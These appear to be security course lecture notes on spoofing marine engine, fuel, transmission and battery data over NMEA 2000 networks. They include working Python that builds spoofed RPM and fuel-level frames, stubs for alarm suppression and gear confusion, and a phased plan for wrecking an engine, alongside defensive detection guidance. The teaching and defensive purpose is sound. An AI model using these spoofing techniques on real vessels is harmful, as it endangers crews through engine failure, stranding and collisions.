---
title: "Class 06"
subtitle: "Engine and Propulsion System Attacks"
author: "Constantine Macris"
date: "2026"
titlepage: true
titlepage-color: "1E3A5F"
titlepage-text-color: "FFFFFF"
titlepage-rule-color: "FFFFFF"
titlepage-rule-height: 2
book: true
classoption: oneside
code-block-font-size: \scriptsize
description: |
    Attacking engine monitoring and propulsion systems via NMEA 2000
---

# Class 06 -- Engine and Propulsion System Attacks

## Learning Outcomes

- Understand engine PGN message structures
- Construct valid engine parameter messages
- Execute propulsion system data manipulation
- Recognize safety implications of engine attacks
- Apply attack knowledge to defensive strategies

## Definitions

- **Engine Gateway** -- Device converting engine data to NMEA 2000
- **RPM** -- Revolutions Per Minute
- **Propulsion** -- Systems that move the vessel
- **Alarm Suppression** -- Hiding legitimate warnings
- **False Alarm** -- Creating fake warning conditions

## Reading Assignment

- Literature Review: Section 2.4 (Attack Taxonomy)
- Literature Review: Section 3.1 (Automotive attack parallels)
- Marine engine manufacturer NMEA 2000 documentation

## Engine Systems on NMEA 2000

### Why Target Engine Systems?

Engine attacks can cause:

1. **Safety hazards** -- Crew relies on accurate readings
2. **Equipment damage** -- Running engines outside safe parameters
3. **Stranding** -- Disabling propulsion at sea
4. **Environmental damage** -- Oil/fuel system failures
5. **Economic loss** -- Unnecessary maintenance from false alarms

### Typical Engine Network Architecture

```
┌─────────────┐
│   Engine    │
│   ECU       │
└──────┬──────┘
       │ J1939
       ▼
┌─────────────┐     NMEA 2000     ┌─────────────┐
│   Gateway   │◄─────────────────►│ Chart       │
│   Device    │                   │ Plotter     │
└─────────────┘                   └─────────────┘
       │
       ▼
┌─────────────┐
│   Engine    │
│   Display   │
└─────────────┘
```

<!--
Instructor Notes:

Key insight: Most vessels use gateway devices to convert
engine protocols (J1939, proprietary) to NMEA 2000.

The gateway is trusted - no authentication.
If attacker can send NMEA 2000 messages, they can
impersonate the gateway and fake any engine data.

Real-world example: Engine ECUs often have CAN connections
directly accessible in engine rooms with minimal security.
-->

## Engine Parameter PGNs

### Key Engine PGNs

| PGN | Name | Rate | Critical Data |
|-----|------|------|---------------|
| 127488 | Engine Parameters, Rapid | 10 Hz | RPM, Boost, Tilt |
| 127489 | Engine Parameters, Dynamic | 0.5 Hz | Oil pressure, Temp, Hours |
| 127493 | Transmission Parameters | 1 Hz | Gear, Oil pressure/temp |
| 127505 | Fluid Level | 2.5 Hz | Fuel, Oil, Water levels |
| 127508 | Battery Status | 1 Hz | Voltage, Current, Temp |

### PGN 127488: Engine Parameters, Rapid Update

```
Rate: 10 Hz (100ms)
Length: 8 bytes

Byte 0: Engine Instance
Byte 1-2: Engine Speed (RPM, 0.25 RPM/bit)
Byte 3-4: Engine Boost Pressure (hPa)
Byte 5: Engine Tilt/Trim (%)
Byte 6-7: Reserved
```

### Building Engine RPM Spoof

```python
import struct

def build_engine_rapid_pgn(instance, rpm, boost_hpa=0, tilt_pct=0, source_addr=254):
    """
    Build PGN 127488 Engine Parameters Rapid Update

    Args:
        instance: Engine instance (0=single, 0/1=twin)
        rpm: Engine RPM (0-16383.75)
        boost_hpa: Boost pressure in hPa
        tilt_pct: Tilt/trim percentage
        source_addr: Source address to spoof
    """
    # Convert RPM to raw (0.25 RPM/bit)
    rpm_raw = int(rpm / 0.25)

    # Build CAN ID
    priority = 2
    pgn = 127488
    data_page = (pgn >> 16) & 0x1
    pdu_format = (pgn >> 8) & 0xFF
    pdu_specific = pgn & 0xFF

    can_id = (priority << 26) | (data_page << 24) | \
             (pdu_format << 16) | (pdu_specific << 8) | source_addr

    # Build data payload
    data = struct.pack('<BHHBH',
                      instance,
                      rpm_raw,
                      boost_hpa,
                      int(tilt_pct * 2.5),  # 0.4%/bit
                      0xFFFF)  # Reserved

    return can_id, data

# Example: Spoof engine showing 3000 RPM
can_id, data = build_engine_rapid_pgn(0, 3000, source_addr=41)
print(f"CAN ID: {can_id:08X}")
print(f"Data: {data.hex()}")
```

<!--
Instructor Notes:

Walk through the attack:
1. Engine actually at idle (700 RPM)
2. Attacker spoofs 3000 RPM
3. Display shows high RPM
4. Crew may reduce throttle thinking engine is racing
5. Or ignore actual high RPM thinking display is stuck

Discuss: What if we spoofed 0 RPM while engine running?
- Crew might try to start already-running engine
- Could damage starter or flywheel
-->

## PGN 127489: Engine Parameters, Dynamic

### Message Structure

```
PGN 127489: Engine Parameters, Dynamic
Rate: 0.5 Hz (2000ms)
Length: 26 bytes (Fast Packet)

Byte 0: Engine Instance
Byte 1-2: Oil Pressure (hPa)
Byte 3-4: Oil Temperature (0.1K)
Byte 5-6: Temperature (0.01K)
Byte 7-8: Alternator Potential (0.01V)
Byte 9-10: Fuel Rate (0.1 L/h)
Byte 11-14: Total Engine Hours (s)
Byte 15-16: Coolant Pressure (hPa)
Byte 17-18: Fuel Pressure (kPa)
Byte 19: Reserved
Byte 20-21: Discrete Status 1
Byte 22-23: Discrete Status 2
Byte 24: Percent Engine Load (%)
Byte 25: Percent Engine Torque (%)
```

### Attack Scenarios

#### Scenario 1: Oil Pressure Alarm Suppression

```python
def suppress_oil_alarm(instance, source_addr):
    """
    Spoof normal oil pressure to hide actual low pressure
    DANGEROUS: Could lead to engine damage
    """
    normal_oil_pressure = 400  # 400 hPa = ~58 PSI (normal)
    normal_oil_temp = 3630     # 90°C in 0.1K (3630 = 363K = 90°C)
    normal_engine_temp = 35500 # 355K = 82°C in 0.01K

    # Build fake "everything normal" message
    # ... (implementation)
    pass
```

#### Scenario 2: False Overheat Alarm

```python
def trigger_false_overheat(instance, source_addr):
    """
    Spoof high temperature to cause unnecessary shutdown
    Could strand vessel in dangerous waters
    """
    critical_temp = 39000  # 390K = 117°C - CRITICAL

    # Build fake overheating message
    # ... (implementation)
    pass
```

<!--
Instructor Notes:

CRITICAL SAFETY DISCUSSION:

Oil pressure suppression:
- Engine could seize if oil pressure actually low
- Crew trusts instruments
- Cost: Destroyed engine ($50,000+)

False overheat:
- Crew shuts down engine
- Vessel loses propulsion
- In shipping lane or bad weather = disaster

Real incident: Engine room sensors spoofed on cargo vessel
led to unnecessary dry dock inspection ($100K+ cost).
-->

## Fluid Level Spoofing (PGN 127505)

### Message Structure

```
PGN 127505: Fluid Level
Rate: 2.5 Hz (400ms)
Length: 8 bytes

Byte 0 (bits 0-3): Fluid Instance
Byte 0 (bits 4-7): Fluid Type
Byte 1-2: Fluid Level (0.004% per bit)
Byte 3-6: Tank Capacity (0.1 L per bit)
Byte 7: Reserved
```

### Fluid Types

| Value | Type |
|-------|------|
| 0 | Fuel |
| 1 | Water |
| 2 | Gray Water |
| 3 | Live Well |
| 4 | Oil |
| 5 | Black Water |

### Building Fluid Level Spoof

```python
def build_fluid_level_pgn(instance, fluid_type, level_pct, capacity_liters, source_addr=254):
    """
    Build PGN 127505 Fluid Level

    Args:
        instance: Tank instance (0-15)
        fluid_type: Type of fluid (0-5)
        level_pct: Fill level percentage (0-100)
        capacity_liters: Tank capacity in liters
        source_addr: Source address to spoof
    """
    import struct

    # Combine instance and type
    instance_type = (instance & 0x0F) | ((fluid_type & 0x0F) << 4)

    # Convert level to raw (0.004% per bit)
    level_raw = int(level_pct / 0.004)

    # Convert capacity to raw (0.1 L per bit)
    capacity_raw = int(capacity_liters / 0.1)

    # Build CAN ID
    priority = 6
    pgn = 127505
    # ... (similar CAN ID construction)

    data = struct.pack('<BHI B',
                      instance_type,
                      level_raw,
                      capacity_raw,
                      0xFF)  # Reserved

    return can_id, data

# Example: Spoof fuel tank showing 80% when actually empty
can_id, data = build_fluid_level_pgn(0, 0, 80.0, 500.0, source_addr=45)
```

### Attack Impact

| Attack | Consequence |
|--------|-------------|
| Fuel = 0% | Unnecessary fuel stop, economic loss |
| Fuel = 100% | Run out of fuel at sea |
| Oil = 100% | Engine damage from overfill |
| Coolant = 0% | Unnecessary engine shutdown |

<!--
Instructor Notes:

Fuel level spoofing is particularly dangerous:

1. Show empty when full:
   - Captain orders unnecessary refueling
   - $5,000+ fuel cost for large vessel

2. Show full when empty:
   - Run out of fuel mid-voyage
   - Coast Guard rescue required
   - Potential grounding/collision

Real scenario: Fishing vessel ran out of fuel
50 miles offshore due to faulty fuel sensor.
Imagine if that was intentional spoofing.
-->

## Transmission Attacks (PGN 127493)

### Message Structure

```
PGN 127493: Transmission Parameters, Dynamic
Rate: 1 Hz
Length: 8 bytes

Byte 0: Transmission Instance
Byte 1 (bits 0-1): Gear
Byte 1 (bits 2-7): Reserved
Byte 2-3: Oil Pressure (hPa)
Byte 4-5: Oil Temperature (0.1K)
Byte 6: Discrete Status 1
Byte 7: Reserved
```

### Gear Values

| Value | Gear Position |
|-------|---------------|
| 0 | Forward |
| 1 | Neutral |
| 2 | Reverse |
| 3 | Unknown |

### Attack Scenario: Gear Confusion

```python
def spoof_transmission_gear(instance, gear, source_addr):
    """
    Spoof transmission gear indicator

    WARNING: Could cause confusion during docking
    """
    gear_map = {'forward': 0, 'neutral': 1, 'reverse': 2}

    # Build message showing opposite gear
    # Crew thinks in reverse, actually in forward
    # During close-quarters maneuvering = collision
    pass
```

<!--
Instructor Notes:

Gear indicator spoofing during docking:
1. Captain believes vessel in reverse
2. Applies throttle
3. Vessel moves forward into dock/other vessel
4. Collision damage

This attack requires precise timing but has
immediate physical consequences.

Note: Modern vessels have multiple indicators,
but crew may trust electronic display over
mechanical backup.
-->

## Battery Status Attacks (PGN 127508)

### Message Structure

```
PGN 127508: Battery Status
Rate: 1 Hz
Length: 8 bytes

Byte 0: Battery Instance
Byte 1-2: Voltage (0.01V)
Byte 3-4: Current (0.1A, signed)
Byte 5-6: Temperature (0.01K)
Byte 7: SID
```

### Attack Scenarios

1. **Spoof low voltage** → Crew thinks batteries dead
2. **Spoof high voltage** → Ignore actual overcharge
3. **Spoof discharge** → Unnecessary generator start
4. **Spoof charge** → Batteries drain unnoticed

```python
def spoof_battery_critical(instance, source_addr):
    """
    Spoof critically low battery to cause panic
    or hide actual battery problems
    """
    critical_voltage = 1050  # 10.50V = critically low

    # Build message
    # Crew starts generator, wastes fuel
    # Or actual low battery ignored as "sensor fault"
    pass
```

## Combined Attack Scenarios

### Scenario: Complete Engine Room Compromise

An attacker with CAN bus access could:

1. **Phase 1**: Reconnaissance (Week 4 techniques)
   - Identify engine gateway source address
   - Profile message frequencies

2. **Phase 2**: Establish baseline
   - Record normal operating parameters
   - Note alarm thresholds

3. **Phase 3**: Execute attack sequence
   - Suppress oil pressure alarms
   - Spoof normal temperatures while actual overheat
   - Mask fuel consumption

4. **Phase 4**: Cause damage
   - Engine runs without lubrication
   - Overheats without warning
   - Catastrophic failure

<!--
Instructor Notes:

This is the "Jeep Cherokee" scenario applied to maritime:
- Miller/Valasek attacked Jeep via CAN
- Controlled engine, transmission, brakes
- Maritime has same vulnerabilities
- But maritime = lives at stake

Walk through timeline:
- How long until crew notices?
- What redundant systems exist?
- How would they diagnose the problem?

Key defense insight: Cross-validate all sensors.
Multiple independent sources.
-->

## Defense Considerations

### What We Learned as Defenders

1. **Critical PGNs need protection**
   - Engine RPM (127488)
   - Oil pressure (127489)
   - Fuel levels (127505)

2. **Value range validation**
   - RPM can't change 0→3000 instantly
   - Temperature changes gradually
   - Fuel level decreases (mostly)

3. **Cross-sensor validation**
   - Engine sound vs. reported RPM
   - Fuel gauge vs. flow meter
   - Multiple temperature sensors

### Detection Opportunities

| Attack | Detection Method |
|--------|------------------|
| RPM spoofing | Rate of change limits |
| Temperature spoofing | Physical change rate |
| Fuel level jumps | Volume conservation |
| Gear confusion | Engine RPM correlation |

## Lab Preview: Week 7

In Lab 07, you will:

1. Construct engine parameter messages
2. Spoof RPM and temperature values
3. Trigger alarm conditions on test display
4. Observe cascade effects
5. Document attack parameters

**Safety**: All activities on isolated test network only

## Homework

### Required

1. **Read**: Literature Review Section 3.1 (Automotive parallels)
2. **Calculate**: Raw values for these engine parameters:
   - 2500 RPM
   - 45 PSI oil pressure (convert to hPa)
   - 85°C coolant temperature (convert to 0.01K)
3. **Analyze**: What physical constraints limit realistic spoofing?

### Suggested

- Research: Engine gateway device specifications
- Review: J1939 to NMEA 2000 translation
- Consider: How would engine ECU respond to spoofed data?

## Discussion Questions

1. Why are engine systems particularly dangerous to attack?
2. How could crew cross-validate engine parameters manually?
3. What redundant sensors exist on typical vessels?
4. Should engine gateways authenticate messages?

## References

- [NMEA 2000 Engine PGNs]
- [J1939 Digital Annex]
- [Marine Engine Manufacturer Documentation]

[NMEA 2000 Engine PGNs]:https://www.nmea.org
[J1939 Digital Annex]:https://www.sae.org/standards/content/j1939da/
[Marine Engine Manufacturer Documentation]:https://www.mercurymarine.com/en/us/support/
